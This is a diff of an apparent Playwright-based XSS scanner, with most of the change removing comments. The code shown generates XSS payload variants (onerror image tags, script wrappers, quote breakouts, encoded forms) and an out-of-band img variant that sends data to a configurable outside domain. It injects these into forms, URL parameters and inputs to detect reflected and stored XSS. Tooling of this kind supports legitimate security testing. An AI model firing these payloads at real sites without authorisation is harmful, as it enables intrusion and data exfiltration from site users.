@@ -13,11 +13,8 @@ def evade(p):
     variants.append(f'">{raw}')
     variants.append(f'"> <img src=x onerror={raw}>')
     variants.append(f"';{raw}//")
-    # HTML-escaped
     variants.append(html_escape(raw))
-    # URL-encoded
     variants.append(quote(raw))
-    # simple script wrapper
     variants.append(f"<script>{raw}</script>")
 
     # OOB support: if OOB_DOMAIN is set, add an image/exfil variant
@@ -27,7 +24,6 @@ def evade(p):
         oob_payload = f"<img src=\"http://{oob}/{nid}?c={quote(raw)}\">"
         variants.append(oob_payload)
 
-    # Deduplicate while preserving order
     seen = set()
     out = []
     for v in variants:
@@ -65,10 +61,8 @@ def test_form_vulnerability(page, form, payloads):
     for payload in payloads:
         for ev in evade(payload):
             try:
-                # 1. Fill out all inputs in the form
                 filled = False
                 for name, _ in form['inputs']:
-                    # Use a locator that finds the input by name inside the specific form
                     field = page.locator(f"input[name='{name}'], textarea[name='{name}'], select[name='{name}']").first
 
                     if field.is_visible():
@@ -79,7 +73,6 @@ def test_form_vulnerability(page, form, payloads):
                 if not filled:
                     continue
 
-                # 2. Submit the form
                 # Playwright tries to click the button, but if it fails, we use a 'force' submit
                 submit_btn = page.locator("input[type=submit], button[type=submit], button").first
 
@@ -90,15 +83,12 @@ def test_form_vulnerability(page, form, payloads):
                     # Fallback to JavaScript submit if button click fails
                     page.evaluate("document.querySelector('form').submit();")
 
-                # 3. Wait for Reflected XSS (Reaction)
                 page.wait_for_timeout(300)
                 print(colored(f"TESTED (Reflected) --> {page.url} (Payload: {ev})", 'blue'))
 
-                # 4. Check for Stored XSS (Reload the page to see if payload saved)
                 page.goto(form['url'], wait_until="domcontentloaded")
                 page.wait_for_timeout(300)
                 print(colored(f"TESTED (Stored) --> {form['url']} (Payload: {ev})", 'blue'))
-                # 5. Inspect page content for silent reflections (non-alerting XSS)
                 try:
                     content = page.content()
                     for v in _content_variants(ev):
@@ -109,8 +99,7 @@ def test_form_vulnerability(page, form, payloads):
                 except Exception:
                     pass
 
-            except Exception as e:
-                # print(f"Debug error: {e}") # Uncomment for debugging
+            except Exception:
                 continue
 
     page.remove_listener("dialog", handle_dialog)
@@ -145,7 +134,6 @@ def test_url_parameters(page, url, payloads):
     for param in params:
         for payload in payloads:
             for ev in evade(payload):
-                # Construct the malicious URL
                 new_params = {k: ev if k == param else v[0] for k, v in params.items()}
                 new_query = urlencode(new_params, doseq=True)
                 test_url = parsed._replace(query=new_query).geturl()
@@ -157,9 +145,6 @@ def test_url_parameters(page, url, payloads):
                     # Small buffer for JS execution/reflection
                     page.wait_for_timeout(200)
 
-                    # Because the dialog handler is an event listener,
-                    # it will fire automatically if the XSS triggers.
-                    # If it didn't trigger, we log the negative result.
                     print(colored(f"TESTED --> {test_url}", 'blue'))
                     # Inspect content for silent reflections
                     try:
@@ -173,7 +158,6 @@ def test_url_parameters(page, url, payloads):
                         pass
 
                 except Exception as e:
-                    # Handling timeouts or navigation errors
                     continue
 
     page.remove_listener("dialog", handle_dialog)
@@ -231,7 +215,6 @@ def test_loose_inputs(page, url, payloads):
 
     page.goto(url, wait_until="networkidle")
 
-    # Select all potential loose inputs
     # Playwright's locator handles the "find_elements" logic automatically
     input_selector = 'input[type="text"], input[type="search"], input[type="url"], input[type="email"], textarea'
     inputs = page.locator(input_selector)
@@ -246,7 +229,6 @@ def test_loose_inputs(page, url, payloads):
     for i in range(count):
         inp = inputs.nth(i)
 
-        # Skip if not visible or enabled
         if not inp.is_visible() or not inp.is_enabled():
             continue
 
@@ -273,9 +255,6 @@ def test_loose_inputs(page, url, payloads):
                     inp.press("Enter")
                     page.wait_for_timeout(200)
 
-                    # 3. Check if we are still on the page or if it reacted
-                    # If the dialog listener wasn't triggered, we log it
-                    # (In a real scan, we'd check if the payload is reflected in the HTML too)
                     print(colored(f"TESTED --> {page.url} (with payload: {ev})", 'blue'))
 
                     # Reset to original URL for next payload/input
